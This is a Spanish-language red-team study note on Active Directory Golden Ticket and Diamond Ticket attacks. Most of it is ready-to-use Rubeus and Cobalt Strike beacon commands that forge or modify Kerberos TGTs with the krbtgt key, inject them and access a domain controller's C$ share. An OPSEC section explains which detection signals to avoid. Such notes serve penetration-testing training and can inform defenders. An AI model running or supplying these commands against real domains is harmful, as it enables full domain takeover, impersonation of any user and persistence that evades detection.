---
tags: [ad, kerberos, golden-ticket, ticket-forgery, domain-dominance]
status: completo
---

# Golden Ticket

> TGT forjado con el hash del `krbtgt`. Permite impersonar cualquier usuario del dominio y pedir STs para cualquier servicio. Se obtiene el hash vía [[05-ad-attacks/ataques/dcsync|DCSync]].

---

## Forjar el ticket (Rubeus)

```
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /domain:CONTOSO.COM /sid:<domain_SID> /nowrap

# Parámetros:
# /aes256  → AES256 del krbtgt (preferible a RC4 para evasión)
# /user    → usuario a impersonar
# /domain  → FQDN del dominio
# /sid     → SID del dominio (sin el RID final)
```

## Inyectar y usar

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly Rubeus.exe ptt /ticket:<b64_ticket>
beacon> ls \\lon-dc-1\c$
```

> Al acceder a un servicio, Windows usa el TGT inyectado para pedir STs legítimamente via TGS-REQ/TGS-REP — el DC los emite sin saber que el TGT es falso.

---

## Diamond Ticket (variante más sigilosa)

> En vez de forjar un TGT desde cero, solicita uno legítimo y lo **modifica** con el hash del krbtgt. Más difícil de detectar porque todos los campos periféricos son reales.

```
beacon> execute-assembly Rubeus.exe diamond /tgtdeleg /krbkey:<krbtgt_aes256> /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap

# /tgtdeleg     → obtiene un TGT usable del usuario actual sin necesitar credenciales
# /krbkey       → AES256 del krbtgt
# /ticketuser   → usuario a impersonar
# /ticketuserid → RID del usuario
```

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly Rubeus.exe ptt /ticket:<b64_diamond_ticket>
beacon> ls \\lon-dc-1\c$
```

---

## Golden vs Diamond

| | Golden Ticket | Diamond Ticket |
|--|--------------|----------------|
| Creación | Forjado offline desde cero | TGT legítimo modificado |
| AS-REQ | No existe → detectable | Existe → más sigiloso |
| Campos | Controlados por atacante | Heredados del ticket real |
| Detección | 4769 sin 4768 previo | Más difícil |

---

## OPSEC

- **Golden:** uso produce 4769 (TGS-REQ) sin 4768 (AS-REQ) previo → anomalía detectable
- Lifetime anómalo si se usa Mimikatz por defecto (10 años vs 10 horas del dominio)
- **Diamond:** tiene AS-REQ real, pero algunos campos como `FullName` pueden no coincidir con el `UserName` impersonado

---

## Ver también

- [[05-ad-attacks/ataques/dcsync|DCSync]] — cómo obtener el hash del krbtgt
- [[05-ad-attacks/ataques/silver-ticket|Silver Ticket]] — versión limitada a un servicio específico
- [[05-ad-attacks/kerberos|Kerberos]] — protocolo base
